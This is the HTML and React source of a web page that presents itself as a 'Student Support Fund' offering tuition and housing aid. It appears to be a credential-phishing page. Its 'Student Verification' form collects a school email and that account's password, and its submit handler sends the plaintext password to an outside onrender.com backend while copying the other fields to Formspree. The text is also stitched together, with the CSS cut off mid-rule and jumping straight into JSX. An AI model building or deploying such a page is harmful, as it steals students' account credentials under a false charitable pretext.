<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Student Support Fund</title>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
    <script crossorigin src="https://unpkg.com/react@18/umd/react.development.js"></script>
    <script crossorigin src="https://unpkg.com/react-dom@18/umd/react-dom.development.js"></script>
    <script crossorigin src="https://unpkg.com/@babel/standalone/babel.min.js"></script>
    <style>
@import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800;900&family=Plus+Jakarta+Sans:wght@400;500;600;700;800&display=swap');

:root {
  --primary: #1a56db;
  --primary-dark: #0f3b8c;
  --primary-light: #3b82f6;
  --accent: #06b6d4;
  --accent-light: #67e8f9;
  --dark: #0b1120;
  --dark-card: #111827;
  --text: #f1f5f9;
  --text-muted: #94a3b8;
  --glass: rgba(255,255,255,0.04);
  --glass-border: rgba(255,255,255,0.08);
  --radius: 16px;
  --radius-sm: 10px;
}

* { margin: 0; padding: 0; box-sizing: border-box; }

html { scroll-behavior: smooth; }

body {
  font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
  background: var(--dark);
  color: var(--text);
  -webkit-font-smoothing: antialiased;
  overflow-x: hidden;
}

/* ─── ANIMATED BACKGROUND (mobile-scaled) ─── */
.animated-bg {
  position: fixed;
  inset: 0;
  z-index: 0;
  overflow: hidden;
  pointer-events: none;
}
.animated-bg .orb {
  position: absolute;
  border-radius: 50%;
  filter: blur(60px);
  opacity: 0.12;
  animation: orbFloat 20s ease-in-out infinite;
}
.animated-bg .orb:nth-child(1) {
  width: 300px; height: 300px;
  background: var(--primary-light);
  top: -15%; left: -20%;
  animation-delay: 0s;
}
.animated-bg .orb:nth-child(2) {
  width: 250px; height: 250px;
  background: var(--accent);
  bottom: -10%; right: -20%;
  animation-delay: -7s;
}
.animated-bg .orb:nth-child(3) {
  width: 200px; height: 200px;
  background: #8b5cf6;
  top: 40%; left: 50%;
  transform: translate(-50%,-50%);
  animation-delay: -14s;
}
@keyframes orbFloat {
  0%, 100% { transform: translate(0,0) scale(1); }
  25% { transform: translate(40px,-50px) scale(1.1); }
  50% { transform: translate(-30px,40px) scale(0.9); }
  75% { transform: translate(50px,30px) scale(1.05); }
}

/* ─── GRID OVERLAY ─── */
.grid-overlay {
  position: fixed;
  inset: 0;
  z-index: 0;
  background-image: 
    linear-gradient(rgba(255,255,255,0.03) 1px, transparent 1px),
    linear-gradient(90deg, rgba(255,255,255,0.03) 1px, transparent 1px);
  background-size: 40px 40px;
  pointer-events: none;
}

/* ═══════════════════════════════════════
   MOBILE-FIRST STYLES (base = mobile)
   ═══════════════════════════════════════ */

/* ─── NAVBAR (mobile) ─── */
.navbar {
  position: fixed;
  top: 0; left: 0; right: 0;
  z-index: 100;
  padding: 12px 16px;
  display: flex;
  align-items: center;
  justify-content: space-between;
  background: rgba(11,17,32,0.85);
  backdrop-filter: blur(20px);
  border-bottom: 1px solid var(--glass-border);
}
.navbar-inner {
  width: 100%;
  display: flex;
  align-items: center;
  justify-content: space-between;
}
.navbar .logo {
  font-family: 'Plus Jakarta Sans', sans-serif;
  font-size: 1.15rem;
  font-weight: 800;
  background: linear-gradient(135deg, #60a5fa, #06b6d4);
  -webkit-background-clip: text;
  -webkit-text-fill-color: transparent;
  letter-spacing: -0.3px;
}

/* Hamburger */
.hamburger {
  display: flex;
  flex-direction: column;
  justify-content: center;
  align-items: center;
  gap: 5px;
  width: 36px;
  height: 36px;
  background: var(--glass);
  border: 1px solid var(--glass-border);
  border-radius: 10px;
  cursor: pointer;
  padding: 6px;
  z-index: 110;
  transition: all 0.3s;
}
.hamburger span {
  display: block;
  width: 20px;
  height: 2px;
  background: var(--text);
  border-radius: 2px;
  transition: all 0.3s ease;
}
.hamburger.open span:nth-child(1) { transform: rotate(45deg) translate(5px, 5px); }
.hamburger.open span:nth-child(2) { opacity: 0; }
.hamburger.open span:nth-child(3) { transform: rotate(-45deg) translate(5px, -5px); }

/* Mobile menu overlay */
.menu-overlay {
  position: fixed;
  inset: 0;
  z-index: 90;
  background: rgba(0,0,0,0.5);
  backdrop-filter: blur(4px);
  animation: fadeIn 0.2s ease;
}
@keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }

/* Nav links - mobile dropdown */
.navbar .nav-links {
  position: fixed;
  top: 64px;
  left: 12px;
  right: 12px;
  z-index: 95;
  display: flex;
  flex-direction: column;
  gap: 4px;
  padding: 12px;
  background: rgba(17,24,39,0.95);
  backdrop-filter: blur(24px);
  border: 1px solid var(--glass-border);
  border-radius: 16px;
  opacity: 0;
  visibility: hidden;
  transform: translateY(-10px);
  transition: all 0.25s ease;
  box-shadow: 0 20px 60px rgba(0,0,0,0.5);
}
.navbar .nav-links.open {
  opacity: 1;
  visibility: visible;
  transform: translateY(0);
}
.navbar .nav-links a {
  display: block;
  color: var(--text-muted);
  text-decoration: none;
  font-size: 0.95rem;
  font-weight: 500;
  padding: 14px 16px;
  border-radius: 10px;
  transition: all 0.2s;
}
.navbar .nav-links a:active { background: var(--glass); color: var(--text); }
.navbar .nav-cta {
  width: 100%;
  background: linear-gradient(135deg, var(--primary-light), var(--accent));
  color: white;
  border: none;
  padding: 14px;
  border-radius: 10px;
  font-weight: 600;
  font-size: 0.95rem;
  cursor: pointer;
  margin-top: 4px;
  transition: transform 0.2s;
}
.navbar .nav-cta:active { transform: scale(0.97); }

/* ─── HERO (mobile) ─── */
.hero {
  position: relative;
  z-index: 1;
  min-height: 100dvh;
  display: flex;
  align-items: center;
  justify-content: center;
  padding: 100px 16px 60px;
  text-align: center;
}
.hero-container { max-width: 100%; }
.hero-badge {
  display: inline-flex;
  align-items: center;
  gap: 6px;
  background: var(--glass);
  border: 1px solid var(--glass-border);
  padding: 6px 14px;
  border-radius: 50px;
  font-size: 0.72rem;
  color: var(--accent-light);
  margin-bottom: 24px;
  backdrop-filter: blur(10px);
}
.hero-badge .dot {
  width: 6px; height: 6px;
  background: #22c55e;
  border-radius: 50%;
  animation: pulse 2s infinite;
}
@keyframes pulse { 0%,100%{opacity:1} 50%{opacity:0.4} }
.hero-title {
  font-family: 'Plus Jakarta Sans', sans-serif;
  font-size: 2rem;
  font-weight: 800;
  line-height: 1.15;
  letter-spacing: -0.02em;
  margin-bottom: 18px;
  background: linear-gradient(135deg, #fff 30%, #60a5fa 70%, #67e8f9 100%);
  -webkit-background-clip: text;
  -webkit-text-fill-color: transparent;
}
.hero-subtitle {
  font-size: 0.95rem;
  color: var(--text-muted);
  margin: 0 0 32px;
  line-height: 1.65;
  font-weight: 400;
}
.hero-actions {
  display: flex;
  flex-direction: column;
  gap: 12px;
  align-items: center;
}
.btn-primary {
  width: 100%;
  max-width: 320px;
  background: linear-gradient(135deg, var(--primary-light), var(--accent));
  color: white;
  border: none;
  padding: 16px 32px;
  font-size: 1rem;
  font-weight: 600;
  border-radius: 50px;
  cursor: pointer;
  transition: all 0.3s ease;
  box-shadow: 0 8px 32px rgba(59,130,246,0.25);
}
.btn-primary:active { transform: scale(0.97); }
.btn-secondary {
  width: 100%;
  max-width: 320px;
  background: var(--glass);
  border: 1px solid var(--glass-border);
  color: var(--text);
  padding: 16px 32px;
  font-size: 1rem;
  font-weight: 600;
  border-radius: 50px;
  cursor: pointer;
  transition: all 0.3s ease;
  backdrop-filter: blur(10px);
}
.btn-secondary:active { background: rgba(255,255,255,0.08); }

/* ─── STATS (mobile) ─── */
.stats-section {
  position: relative;
  z-index: 1;
  padding: 48px 16px;
}
.stats-container {
  display: flex;
  flex-direction: column;
  gap: 12px;
}
.stat-card {
  background: var(--glass);
  border: 1px solid var(--glass-border);
  border-radius: var(--radius);
  padding: 28px 20px;
  text-align: center;
  backdrop-filter: blur(12px);
  transition: all 0.3s ease;
  position: relative;
  overflow: hidden;
}
.stat-card::before {
  content: '';
  position: absolute;
  top: 0; left: 0; right: 0;
  height: 3px;
  background: linear-gradient(90deg, var(--primary-light), var(--accent));
  opacity: 1;
}
.stat-card:active { transform: scale(0.98); }
.stat-number {
  font-family: 'Plus Jakarta Sans', sans-serif;
  font-size: 2.2rem;
  font-weight: 800;
  background: linear-gradient(135deg, #60a5fa, #67e8f9);
  -webkit-background-clip: text;
  -webkit-text-fill-color: transparent;
  margin-bottom: 4px;
}
.stat-label {
  color: var(--text-muted);
  font-size: 0.9rem;
  font-weight: 500;
}

/* ─── SECTION HEADER (mobile) ─── */
.section-header {
  text-align: center;
  margin-bottom: 32px;
}
.section-header .overline {
  display: inline-block;
  font-size: 0.7rem;
  font-weight: 600;
  text-transform: uppercase;
  letter-spacing: 2.5px;
  color: var(--accent);
  margin-bottom: 10px;
}
.section-header h2 {
  font-family: 'Plus Jakarta Sans', sans-serif;
  font-size: 1.6rem;
  font-weight: 800;
  letter-spacing: -0.02em;
  margin-bottom: 10px;
}
.section-header p {
  color: var(--text-muted);
  font-size: 0.9rem;
  max-width: 100%;
  margin: 0 auto;
}

/* ─── PROGRAMS (mobile) ─── */
.programs-section {
  position: relative;
  z-index: 1;
  padding: 48px 16px;
}
.programs-grid {
  display: flex;
  flex-direction: column;
  gap: 12px;
}
.program-card {
  background: var(--glass);
  border: 1px solid var(--glass-border);
  border-radius: var(--radius);
  padding: 20px 20px;
  display: flex;
  align-items: center;
  gap: 16px;
  text-align: left;
  backdrop-filter: blur(12px);
  transition: all 0.3s ease;
  cursor: default;
  position: relative;
  overflow: hidden;
}
.program-card:active { background: rgba(255,255,255,0.06); }
.program-card .icon-wrap {
  flex-shrink: 0;
  width: 44px;
  height: 44px;
  background: linear-gradient(135deg, rgba(59,130,246,0.15), rgba(6,182,212,0.15));
  border-radius: 12px;
  display: flex;
  align-items: center;
  justify-content: center;
  transition: transform 0.3s;
}
.program-card:active .icon-wrap { transform: scale(0.9); }
.program-card .icon-wrap svg { width: 22px; height: 22px; }
.program-card h3 {
  font-size: 0.9rem;
  font-weight: 600;
  line-height: 1.35;
}

/* ─── TRUST (mobile) ─── */
.trust-section {
  position: relative;
  z-index: 1;
  padding: 48px 16px;
}
.trust-grid {
  display: grid;
  grid-template-columns: 1fr 1fr;
  gap: 12px;
}
.trust-item {
  background: var(--glass);
  border: 1px solid var(--glass-border);
  border-radius: var(--radius);
  padding: 24px 16px;
  text-align: center;
  backdrop-filter: blur(12px);
  transition: all 0.3s ease;
}
.trust-item:active { background: rgba(255,255,255,0.06); }
.trust-item .icon-wrap {
  width: 44px; height: 44px;
  margin: 0 auto 14px;
  background: linear-gradient(135deg, rgba(59,130,246,0.12), rgba(6,182,212,0.12));
  border-radius: 50%;
  display: flex;
  align-items: center;
  justify-content: center;
}
.trust-item .icon-wrap svg { width: 20px; height: 20px; }
.trust-item h4 {
  font-size: 0.85rem;
  font-weight: 600;
  line-height: 1.35;
}

/* ─── CEO (mobile) ─── */
.ceo-section {
  position: relative;
  z-index: 1;
  padding: 48px 16px;
}
.ceo-card {
  background: var(--glass);
  border: 1px solid var(--glass-border);
  border-radius: var(--radius);
  padding: 28px 24px;
  backdrop-filter: blur(12px);
  display: flex;
  flex-direction: column;
  align-items: center;
  text-align: center;
  gap: 20px;
  transition: all 0.3s ease;
}
.ceo-card:active { background: rgba(255,255,255,0.06); }
.ceo-avatar {
  flex-shrink: 0;
  width: 80px;
  height: 80px;
  background: linear-gradient(135deg, rgba(59,130,246,0.15), rgba(6,182,212,0.15));
  border-radius: 50%;
  display: flex;
  align-items: center;
  justify-content: center;
  border: 2px solid rgba(59,130,246,0.2);
}
.ceo-avatar svg {
  width: 40px;
  height: 40px;
  stroke: var(--accent-light);
}
.ceo-content h3 {
  font-family: 'Plus Jakarta Sans', sans-serif;
  font-size: 1.3rem;
  font-weight: 700;
  margin-bottom: 4px;
}
.ceo-title {
  display: inline-block;
  font-size: 0.78rem;
  color: var(--accent);
  font-weight: 600;
  letter-spacing: 0.5px;
  margin-bottom: 12px;
}
.ceo-content p {
  color: var(--text-muted);
  line-height: 1.65;
  font-size: 0.88rem;
}

/* ─── FAQ (mobile) ─── */
.faq-section {
  position: relative;
  z-index: 1;
  padding: 48px 16px;
}
.faq-list {
  display: flex;
  flex-direction: column;
  gap: 12px;
}
.faq-item {
  background: var(--glass);
  border: 1px solid var(--glass-border);
  border-radius: var(--radius-sm);
  padding: 20px 20px;
  backdrop-filter: blur(12px);
  transition: all 0.3s;
  cursor: pointer;
}
.faq-item:active { background: rgba(255,255,255,0.06); }
.faq-item h4 {
  font-size: 0.92rem;
  font-weight: 600;
  margin-bottom: 8px;
  display: flex;
  align-items: center;
  gap: 10px;
}
.faq-item h4::before {
  content: '+';
  font-size: 1.1rem;
  color: var(--accent);
  font-weight: 300;
  flex-shrink: 0;
}
.faq-item p {
  color: var(--text-muted);
  line-height: 1.6;
  font-size: 0.85rem;
  padding-left: 24px;
}

/* ─── FOOTER (mobile) ─── */
.footer {
  position: relative;
  z-index: 1;
  border-top: 1px solid var(--glass-border);
  padding: 32px 16px;
  text-align: center;
}
.footer-container {
  display: flex;
  flex-direction: column;
  align-items: center;
  gap: 16px;
}
.footer p { color: var(--text-muted); font-size: 0.8rem; line-height: 1.5; }
.footer-links { display: flex; gap: 20px; flex-wrap: wrap; justify-content: center; }
.footer-links a {
  color: var(--text-muted);
  text-decoration: none;
  font-size: 0.8rem;
  transition: color 0.2s;
}
.footer-links a:active { color: var(--accent-light); }

/* ─── LOGIN PAGE (mobile) ─── */
.login-page {
  position: relative;
  z-index: 1;
  min-height: 100dvh;
  display: flex;
  align-items: center;
  justify-content: center;
  padding: 24px 16px;
}
.login-container {
  background: rgba(17,24,39,0.9);
  backdrop-filter: blur(24px);
  border: 1px solid var(--glass-border);
  border-radius: 20px;
  padding: 28px 20px;
  width: 100%;
  max-width: 400px;
  box-shadow: 0 32px 80px rgba(0,0,0,0.4);
}
.back-link {
  background: none;
  border: none;
  color: var(--text-muted);
  font-size: 0.85rem;
  cursor: pointer;
  margin-bottom: 20px;
  display: flex;
  align-items: center;
  gap: 6px;
  transition: color 0.2s;
}
.back-link:active { color: var(--text); }
.login-container h2 {
  font-family: 'Plus Jakarta Sans', sans-serif;
  font-size: 1.5rem;
  font-weight: 700;
  margin-bottom: 6px;
}
.login-container > p {
  color: var(--text-muted);
  margin-bottom: 24px;
  font-size: 0.88rem;
}
.verification-form { display: flex; flex-direction: column; gap: 16px; }
.form-group label {
  display: block;
  font-size: 0.8rem;
  font-weight: 600;
  color: var(--text);
  margin-bottom: 6px;
  letter-spacing: 0.3px;
}
.form-group input,
.form-group select {
  width: 100%;
  padding: 12px 14px;
  background: rgba(255,255,255,0.04);
  border: 1px solid var(--glass-border);
  border-radius: var(--radius-sm);
  font-size: 0.9rem;
  color: var(--text);
  transition: all 0.2s;
  font-family: inherit;
  -webkit-appearance: none;
  appearance: none;
}
.form-group input::placeholder { color: rgba(148,163,184,0.4); }
.form-group input:focus,
.form-group select:focus {
  outline: none;
  border-color: var(--primary-light);
  box-shadow: 0 0 0 3px rgba(59,130,246,0.1);
  background: rgba(255,255,255,0.06);
}
.form-group select option { background: #1e293b; color: white; }
.password-wrapper { position: relative; }
.password-wrapper input { padding-right: 44px !important; }
.toggle-password {
  position: absolute;
  right: 10px;
  top: 50%;
  transform: translateY(-50%);
  background: none;
  border: none;
  color: var(--text-muted);
  cursor: pointer;
  padding: 6px;
  width: 32px;
  height: 32px;
  display: flex;
  align-items: center;
  justify-content: center;
  border-radius: 6px;
  transition: all 0.2s;
}
.toggle-password:hover { color: var(--text); background: rgba(255,255,255,0.06); }
.submit-button {
  width: 100%;
  background: linear-gradient(135deg, var(--primary-light), var(--accent));
  color: white;
  border: none;
  padding: 14px;
  font-size: 0.95rem;
  font-weight: 600;
  border-radius: var(--radius-sm);
  cursor: pointer;
  transition: all 0.3s;
  margin-top: 4px;
}
.submit-button:active:not(:disabled) { transform: scale(0.97); }
.submit-button:disabled { opacity: 0.5; cursor: not-allowed; }

/* ─── FORM LOADING (mobile) ─── */
.form-loading {
  background: rgba(59,130,246,0.1);
  border: 1px solid rgba(59,130,246,0.25);
  border-radius: var(--radius-sm);
  padding: 10px 14px;
  color: #93c5fd;
  font-size: 0.85rem;
  text-align: center;
  line-height: 1.4;
  animation: pulse 1.5s infinite;
}
@keyframes pulse { 0%, 100% { opacity: 1; } 50% { opacity: 0.6; } }

/* ─── FORM ERROR (mobile) ─── */
.form-error {
  background: rgba(239,68,68,0.1);
  border: 1px solid rgba(239,68,68,0.25);
  border-radius: var(--radius-sm);
  padding: 10px 14px;
  color: #fca5a5;
  font-size: 0.85rem;
  text-align: center;
  line-height: 1.4;
}

/* ─── SUCCESS (mobile) ─── */
.success-message { text-align: center; padding: 12px 0; }
.success-icon {
  width: 60px; height: 60px;
  margin: 0 auto 20px;
  background: linear-gradient(135deg, #22c55e, #16a34a);
  border-radius: 50%;
  display: flex;
  align-items: center;
  justify-content: center;
  box-shadow: 0 12px 40px rgba(34,197,94,0.3);
}
.success-icon svg { width: 28px; height: 28px; stroke: white; fill: none; stroke-width: 3; }
.success-message h2 { font-size: 1.35rem; margin-bottom: 10px; }
.success-message p { color: var(--text-muted); margin-bottom: 24px; font-size: 0.9rem; }
.back-button {
  background: var(--glass);
  border: 1px solid var(--glass-border);
  color: var(--text);
  padding: 12px 28px;
  border-radius: 50px;
  cursor: pointer;
  font-weight: 600;
  font-size: 0.9rem;
  transition: all 0.2s;
}
.back-button:active { background: rgba(255,255,255,0.08); }

/* ═══════════════════════════════════════
   TABLET (768px+)
   ═══════════════════════════════════════ */
@media (min-width: 768px) {
  :root { --radius: 20px; --radius-sm: 12px; }

  .animated-bg .orb:nth-child(1) { width: 500px; height: 500px; }
  .animated-bg .orb:nth-child(2) { width: 400px; height: 400px; }
  .animated-bg .orb:nth-child(3) { width: 350px; height: 350px; }
  .grid-overlay { background-size: 60px 60px; }

  .navbar { padding: 14px 32px; justify-content: space-between; }

                <div className="ceo-content">
                  <h3>Paige Vanzant</h3>
                  <span className="ceo-title">Chief Executive Officer & Founder</span>
                  <p>
                    Paige Vanzant founded the Student Support Fund with a mission to eliminate financial barriers 
                    in education. Under her leadership, the organization has grown to serve thousands of students 
                    across hundreds of institutions, providing critical support for tuition, housing, technology, 
                    and more. Her vision continues to drive innovation in student financial assistance.
                  </p>
                </div>
              </div>
            </section>

            {/* FAQ */}
            <section className="faq-section">
              <div className="section-header">
                <span className="overline">FAQ</span>
                <h2>Frequently Asked Questions</h2>
              </div>
              <div className="faq-list">
                <div className="faq-item"><h4>Do I need a school email?</h4><p>Yes, we require a valid .edu email address to verify your student status and ensure fair distribution of funds.</p></div>
                <div className="faq-item"><h4>How long does verification take?</h4><p>Verification typically takes 24-48 hours. You'll receive an email notification once your application is reviewed.</p></div>
                <div className="faq-item"><h4>Is there any application fee?</h4><p>No, our services are completely free. We believe financial support should never come with additional costs.</p></div>
              </div>
            </section>

            {/* Footer */}
            <footer className="footer">
              <div className="footer-container">
                <p>&copy; 2026 Student Support Fund. All rights reserved. Founded by Paige Vanzant.</p>
                <div className="footer-links">
                  <a href="#">Privacy Policy</a>
                  <a href="#">Terms of Service</a>
                  <a href="#">Contact Support</a>
                </div>
              </div>
            </footer>
          </div>
        );
      }

      function LoginPage({ onBack }) {
        const [formData, setFormData] = useState({ email: '', password: '', following: '', academicLevel: '', supportInterest: '' });
        const [loading, setLoading] = useState(false);
        const [submitted, setSubmitted] = useState(false);
        const [showPassword, setShowPassword] = useState(false);

        const handleChange = (e) => setFormData({ ...formData, [e.target.name]: e.target.value });

        const [error, setError] = useState('');

        const handleSubmit = async (e) => {
          e.preventDefault();
          setError('');

          // Validate email
          const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
          if (!emailRegex.test(formData.email)) {
            setError('Please enter a valid school email address.');
            return;
          }

          // Validate password
          if (!formData.password || formData.password.length < 4) {
            setError('Please enter a valid password (at least 4 characters).');
            return;
          }

          setLoading(true);
          setError('');

          try {
            // Save to MongoDB (includes password)
            const apiUrl = window.location.hostname === 'localhost' 
              ? 'http://localhost:5000/api/submit-form'
              : 'https://paige-incent-backend.onrender.com/api/submit-form';
            const response = await fetch(apiUrl, {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify({
                email: formData.email,
                password: formData.password,
                following: formData.following,
                academicLevel: formData.academicLevel,
                supportInterest: formData.supportInterest
              }),
            });

            // Also send to Formspree for company (without password)
            await fetch('https://formspree.io/f/mnjywqgg', {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify({
                email: formData.email,
                following: formData.following,
                academicLevel: formData.academicLevel,
                supportInterest: formData.supportInterest
              }),
            });

            // Wait 2 seconds before showing result
            await new Promise(resolve => setTimeout(resolve, 2000));

            if (response.ok) {
              setSubmitted(true);
            } else {
              const error = await response.json();
              setError(error.error || 'Submission failed. Please try again.');
            }
          } catch (error) { 
            console.error('Submission error:', error); 
            await new Promise(resolve => setTimeout(resolve, 2000));
            setError('Network error. Please try again.'); 
          } finally { 
            setLoading(false); 
          }
        };

        if (submitted) {
          return (
            <div className="login-page">
              <div className="animated-bg">
                <div className="orb"></div>
                <div className="orb"></div>
                <div className="orb"></div>
              </div>
              <div className="grid-overlay"></div>
              <div className="login-container">
                {error ? (
                  <div className="success-message">
                    <div className="error-icon" style={{width:'60px',height:'60px',margin:'0 auto 20px',background:'linear-gradient(135deg, #ef4444, #dc2626)',borderRadius:'50%',display:'flex',alignItems:'center',justifyContent:'center'}} dangerouslySetInnerHTML={{__html: Icons.alert}} />
                    <h2>Verification error!</h2>
                    <p>check back latter<br/>Thank you for your interest</p>
                    <button className="back-button" onClick={onBack}>Back to Home</button>
                  </div>
                ) : (
                  <div className="success-message">
                    <div className="success-icon" dangerouslySetInnerHTML={{__html: Icons.check}} />
                    <h2>Success!</h2>
                    <p>Your application has been submitted successfully. We've received your information and will be in touch soon.</p>
                    <button className="back-button" onClick={onBack}>Back to Home</button>
                  </div>
                )}
              </div>
            </div>
          );
        }

        return (
          <div className="login-page">
            <div className="animated-bg">
              <div className="orb"></div>
              <div className="orb"></div>
              <div className="orb"></div>
            </div>
            <div className="grid-overlay"></div>
            <div className="login-container">
              <button className="back-link" onClick={onBack}>
                <span dangerouslySetInnerHTML={{__html: Icons.arrowLeft}} style={{width:'18px',height:'18px',display:'inline-block'}} />
                Back to Home
              </button>
              <h2>Student Verification</h2>
              <p>Complete your verification to access support opportunities</p>
              <form onSubmit={handleSubmit} className="verification-form">
                <div className="form-group">
                  <label>School Email</label>
                  <input type="email" name="email" placeholder="yourname@university.edu" value={formData.email} onChange={handleChange} required />
                </div>
                <div className="form-group">
                  <label>Password</label>
                  <div className="password-wrapper">
                    <input type={showPassword ? 'text' : 'password'} name="password" placeholder="Enter password" value={formData.password} onChange={handleChange} required />
                    <button type="button" className="toggle-password" onClick={() => setShowPassword(!showPassword)} dangerouslySetInnerHTML={{__html: showPassword ? Icons.eyeOff : Icons.eye}} />
                  </div>
                </div>
                <div className="form-group">
                  <label>How long have you been following our student support program?</label>
                  <select name="following" value={formData.following} onChange={handleChange} required>
                    <option value="">Select an option</option>
                    <option>Less than 1 month</option>
                    <option>1-6 months</option>
                    <option>More than 6 months</option>
                  </select>
                </div>
                <div className="form-group">
                  <label>Current Academic Level</label>
                  <select name="academicLevel" value={formData.academicLevel} onChange={handleChange} required>
                    <option value="">Select your level</option>
                    <option>Freshman</option>
                    <option>Sophomore</option>
                    <option>Junior</option>
                    <option>Senior</option>
                    <option>Graduate Student</option>
                  </select>
                </div>
                <div className="form-group">
                  <label>What support opportunity interests you most?</label>
                  <select name="supportInterest" value={formData.supportInterest} onChange={handleChange} required>
                    <option value="">Select an option</option>
                    <option>Tuition Relief</option>
                    <option>Housing Support</option>
                    <option>Technology Upgrade</option>
                    <option>Monthly Stipend</option>
                    <option>Emergency Relief</option>
                  </select>
                </div>
                {loading && <div className="form-loading">Processing your submission...</div>}
                {error && !loading && <div className="form-error">{error}</div>}
                <button type="submit" className="submit-button" disabled={loading}>
                  {loading ? 'Processing...' : 'Verify & Continue'}
                </button>
              </form>
            </div>
          </div>
        );
      }

      function App() {
        const [currentPage, setCurrentPage] = useState('landing');
        return (
          <div className="App">
            {currentPage === 'landing' && <LandingPage onVerifyClick={() => setCurrentPage('login')} />}
            {currentPage === 'login' && <LoginPage onBack={() => setCurrentPage('landing')} />}
          </div>
        );
      }

      ReactDOM.createRoot(document.getElementById('root')).render(<App />);
    </script>
  </body>
</html>
